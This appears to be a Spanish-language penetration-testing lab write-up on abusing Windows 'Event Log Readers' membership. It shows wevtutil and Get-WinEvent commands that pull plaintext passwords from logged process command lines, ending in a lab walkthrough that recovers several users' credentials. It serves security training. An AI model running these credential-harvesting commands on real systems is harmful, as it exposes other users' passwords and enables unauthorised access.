
# Lectores de Registros de Eventos

Supongamos que [la auditoría de](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-process-creation) los eventos de creación de procesos y los valores de línea de comandos correspondientes está habilitada. En ese caso, esta información se guarda en el registro de eventos de seguridad de Windows como ID de evento [4688: Se ha creado un nuevo proceso](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688) . Las organizaciones pueden habilitar el registro de líneas de comandos de procesos para ayudar a los defensores a monitorear e identificar posibles comportamientos maliciosos e identificar binarios que no deberían estar presentes en un sistema. Estos datos se pueden enviar a una herramienta SIEM o incorporar en una herramienta de búsqueda, como ElasticSearch, para brindarles a los defensores visibilidad sobre qué binarios se están ejecutando en los sistemas de la red. Las herramientas luego marcarían cualquier actividad potencialmente maliciosa, como los `whoami`comandos `netstat`, y `tasklist`que se ejecutan desde la estación de trabajo de un ejecutivo de marketing.

Este [estudio](https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html) muestra algunos de los comandos más ejecutados por los atacantes después del acceso inicial ( `tasklist`, `ver`, `ipconfig`, `systeminfo`, etc.), para reconocimiento ( `dir`, `net view`, `ping`, `net use`, `type`etc.) y para propagar malware dentro de una red ( `at`, `reg`, `wmic`, `wusa`, etc.). Además de monitorear la ejecución de estos comandos, una organización podría ir un paso más allá y restringir la ejecución de comandos específicos utilizando reglas de AppLocker ajustadas. Para una organización con un presupuesto de seguridad ajustado, aprovechar estas herramientas integradas de Microsoft puede ofrecer una excelente visibilidad de las actividades de la red a nivel de host. La mayoría de las herramientas EDR empresariales modernas realizan detección/bloqueo, pero pueden estar fuera del alcance de muchas organizaciones debido a restricciones presupuestarias y de personal. Este pequeño ejemplo muestra que las mejoras de seguridad, como la visibilidad a nivel de red y host, se pueden realizar con un mínimo esfuerzo, costo e impacto masivo.

Hace unos años realicé una prueba de penetración contra una organización de tamaño mediano con un equipo de seguridad pequeño, sin EDR empresarial, pero estaba usando una configuración similar a la que se detalla anteriormente (auditoría de creación de procesos y valores de línea de comandos). Detectaron y contuvieron a uno de los miembros de mi equipo cuando ejecutó el `tasklist`comando desde la estación de trabajo de un miembro del departamento de finanzas (después de capturar credenciales `Responder`y descifrarlas sin conexión).

Los administradores o miembros del grupo [Lectores del registro de eventos](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255\(v=ws.11\)?redirectedfrom=MSDN#event-log-readers) tienen permiso para acceder a este registro. Es posible que los administradores del sistema quieran agregar usuarios avanzados o desarrolladores a este grupo para realizar determinadas tareas sin tener que otorgarles acceso administrativo.

### **Confirmación de membresía del grupo**

```cmd-session
C:\htb> net localgroup "Event Log Readers"

Alias name     Event Log Readers
Comment        Members of this group can read event logs from local machine

Members

-------------------------------------------------------------------------------
logger
The command completed successfully.
```

Microsoft ha publicado una [guía](https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf) de referencia para todos los comandos integrados de Windows, que incluye sintaxis, parámetros y ejemplos. Muchos comandos de Windows admiten el paso de una contraseña como parámetro y, si está habilitada la auditoría de las líneas de comandos de proceso, se capturará esta información confidencial.

Podemos consultar eventos de Windows desde la línea de comandos utilizando la utilidad [wevtutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil) y el cmdlet de PowerShell [Get-WinEvent](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.1) .

### **Búsqueda de registros de seguridad mediante wevtutil**

```powershell-session
PS C:\htb> wevtutil qe Security /rd:true /f:text | Select-String "/user"

        Process Command Line:   net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

También podemos especificar credenciales alternativas para `wevtutil`utilizar los parámetros `/u`y `/p`.

### **Pasando credenciales a wevtutil**

```cmd-session
C:\htb> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

Para `Get-WinEvent`, la sintaxis es la siguiente. En este ejemplo, filtramos los eventos de creación de procesos (4688), que se encuentran `/user`en la línea de comandos del proceso.

Nota: Para buscar en el `Security`registro de eventos `Get-WInEvent` se requiere acceso de administrador o permisos ajustados en la clave de registro . No basta con `HKLM\System\CurrentControlSet\Services\Eventlog\Security`pertenecer únicamente al grupo.`Event Log Readers`

### **Búsqueda de registros de seguridad con Get-WinEvent**

```powershell-session
PS C:\htb> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

CommandLine
-----------
net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

El cmdlet también se puede ejecutar como otro usuario con el `-Credential`parámetro.

Otros registros incluyen el registro [operativo de PowerShell](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.1) , que también puede contener información confidencial o credenciales si el registro de bloques de scripts o módulos está habilitado. Este registro es accesible para usuarios sin privilegios.

***

## <mark style="color:purple;">Caso práctico</mark>

```bash
Objetivo: 10.129.2.182 (ACADEMY-WINLPE-SRV01)

RDP con el usuario "logger" y la contraseña "HTB_@cademy_stdnt!"
```

> Utilizando los métodos demostrados en esta sección, encuentre la contraseña del usuario mary.

#### Comprobar membresía de grupo

Este usuario no tiene acceso de admin a Powershell, asi que lo ejecutamos normalmente:

```powershell
PS C:\Users\logger> net localgroup "Event Log Readers"
Alias name     Event Log Readers
Comment        Members of this group can read event logs from local machine

Members
-------------------------------------------------------------------------------
logger
The command completed successfully.
```

Vemos que el usuario logger pertenece al grupo Event Log Readers

#### Búsqueda de registros con webtutil

```powershell
PS C:\Users\logger> wevtutil qe Security /rd:true /f:text | Select-String "/user"

        Process Command Line:   cmdkey  /add:WEB01 /user:amanda /pass:Passw0rd!
        Process Command Line:   net  use Z: \\DB01\scripts /user:mary W1ntergreen_gum_****!
        Process Command Line:   net  use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

Encontramos la contraseña en plano del usuario Mary y otros 2 usuarios del sistema.
